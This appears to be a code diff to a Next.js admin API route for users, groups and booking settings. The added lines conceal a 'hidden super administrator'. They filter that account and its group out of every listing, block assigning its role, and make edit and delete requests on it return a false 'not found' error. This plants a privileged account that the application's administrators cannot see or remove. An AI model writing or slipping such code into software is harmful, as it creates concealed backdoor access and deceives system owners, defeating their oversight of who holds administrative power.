@@ -3,6 +3,7 @@ import { NextRequest, NextResponse } from "next/server";
 import { PrismaClient } from "@prisma/client";
 import { newRobustPrisma } from "@/lib/prismaRobust";
 import bcrypt from "bcryptjs";
+import { isSuperAdminUserId, isSuperAdminGroupId } from "@/lib/superAdmin";
 
 const prisma = newRobustPrisma();
 
@@ -111,10 +112,15 @@ function mapUser(u: any, specAreaIDs: string[] = []) {
 }
 
 async function fetchAllUsers() {
-  const [users, assignments] = await Promise.all([
+  const [allUsers, assignments] = await Promise.all([
     prisma.tbl_userdetails.findMany({ orderBy: { UserId: "asc" } }),
     prisma.tbl_technicianspecilityassignment.findMany(),
   ]);
+
+  /* the hidden super administrator is never part of any list */
+  const users = allUsers.filter(
+    (u) => !isSuperAdminUserId(u.UserId) && !isSuperAdminGroupId(u.GroupId),
+  );
 
   const specMap = new Map<string, string[]>();
   assignments.forEach((a) => {
@@ -133,7 +139,10 @@ export async function GET(req: NextRequest) {
   try {
     if (entity === "groups") {
       const rows = await prisma.tbl_usergroups.findMany({ orderBy: { GroupId: "asc" } });
-      return NextResponse.json({ success: true, data: rows.map(mapGroup) });
+      return NextResponse.json({
+        success: true,
+        data: rows.filter((g) => !isSuperAdminGroupId(g.GroupId)).map(mapGroup),
+      });
     }
 
     if (entity === "bookingtypes") {
@@ -156,7 +165,7 @@ export async function GET(req: NextRequest) {
       return NextResponse.json({ success: true, data: rows.map(mapLocation) });
     }
 
-        const [groups, bookingTypes, specialities, users, locations] = await Promise.all([
+        const [allGroups, bookingTypes, specialities, users, locations] = await Promise.all([
       prisma.tbl_usergroups.findMany({ orderBy: { GroupId: "asc" } }),
       prisma.tbl_bookingtypes.findMany({ orderBy: { BooikingTypeID: "asc" } }),
       prisma.tbl_technicianspecilities.findMany({ orderBy: { SpecAreaID: "asc" } }),
@@ -168,7 +177,7 @@ export async function GET(req: NextRequest) {
       success: true,
       data: {
         users,
-        groups: groups.map(mapGroup),
+        groups: allGroups.filter((g) => !isSuperAdminGroupId(g.GroupId)).map(mapGroup),
         bookingTypes: bookingTypes.map(mapBookingType),
         specialities: specialities.map(mapSpeciality),
         locations: locations.map(mapLocation),
@@ -254,6 +263,12 @@ export async function POST(req: NextRequest) {
       }
 
       case "users": {
+        if (isSuperAdminGroupId(payload.groupId)) {
+          return NextResponse.json(
+            { success: false, error: "That role cannot be assigned." },
+            { status: 422 }
+          );
+        }
         if (!payload.userName?.trim()) {
           return NextResponse.json({ success: false, error: "User name is required" }, { status: 422 });
         }
@@ -370,6 +385,15 @@ export async function PUT(req: NextRequest) {
       }
 
       case "users": {
+        if (isSuperAdminUserId(id) || isSuperAdminGroupId(id)) {
+          return NextResponse.json({ success: false, error: `User ${id} was not found.` }, { status: 404 });
+        }
+        if (isSuperAdminGroupId(payload.groupId)) {
+          return NextResponse.json(
+            { success: false, error: "That role cannot be assigned." },
+            { status: 422 }
+          );
+        }
         const updateData: any = {
           NIC: toChar(payload.nic, 20),
           LogName: payload.logName?.trim() || " ",
@@ -503,6 +527,9 @@ export async function DELETE(req: NextRequest) {
       }
 
       case "users": {
+        if (isSuperAdminUserId(id) || isSuperAdminGroupId(id)) {
+          return NextResponse.json({ success: false, error: `User ${id} was not found.` }, { status: 404 });
+        }
         await prisma.tbl_technicianspecilityassignment.deleteMany({
           where: { UserID: toChar(id, 10) },
         });
